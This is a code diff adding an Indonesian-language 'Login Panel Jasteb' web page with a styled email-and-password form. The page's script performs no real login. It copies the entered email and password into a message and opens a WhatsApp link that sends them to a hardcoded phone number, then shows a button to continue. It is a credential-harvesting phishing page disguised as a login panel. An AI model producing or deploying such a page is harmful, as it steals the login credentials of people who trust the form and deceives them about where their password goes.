@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Panel Jasteb 🚀</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+        body {
+            background: url('https://files.catbox.moe/6cd03g.jpg') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+            font-family: 'Orbitron', sans-serif;
+            color: white;
+        }
+
+        .container {
+            margin-top: 50px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            display: inline-block;
+            border-radius: 10px;
+            backdrop-filter: blur(5px);
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.2);
+        }
+
+        .profile {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 5px solid;
+            animation: rainbow 3s infinite linear;
+        }
+
+        @keyframes rainbow {
+            0% { border-color: red; }
+            20% { border-color: orange; }
+            40% { border-color: yellow; }
+            60% { border-color: green; }
+            80% { border-color: blue; }
+            100% { border-color: purple; }
+        }
+
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+            box-shadow: 2px 2px 10px rgba(255, 255, 255, 0.2);
+        }
+
+        input {
+            width: 80%;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid white;
+        }
+
+        button {
+            background-color: #ff9800;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #e68900;
+            transform: scale(1.05);
+        }
+
+        #lanjutkan {
+            display: none;
+            background-color: #4caf50;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://files.catbox.moe/1uw0bc.png" class="profile" alt="Profile">
+        <h1>Login Panel Jasteb 🚀</h1>
+
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Masukkan Email" required>
+            <input type="password" id="password" placeholder="Masukkan Password" required>
+            <button type="submit">Submit</button>
+        </form>
+
+        <button id="lanjutkan" onclick="window.location.href='halaman-jasteb.html'">Lanjutkan ke Panel Jasteb</button>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email.includes("@")) {
+                alert("Masukkan email yang valid!");
+                return;
+            }
+
+            let pesan = `🔥 LOGIN PANEL JASTEB 🔥\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            let nomorWA = "6283151020504";
+            let urlWA = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
+
+            // Kirim ke WhatsApp
+            window.open(urlWA, "_blank");
+
+            // Munculkan tombol lanjutkan
+            document.getElementById("lanjutkan").style.display = "block";
+        });
+    </script>
+
+</body>
+</html>
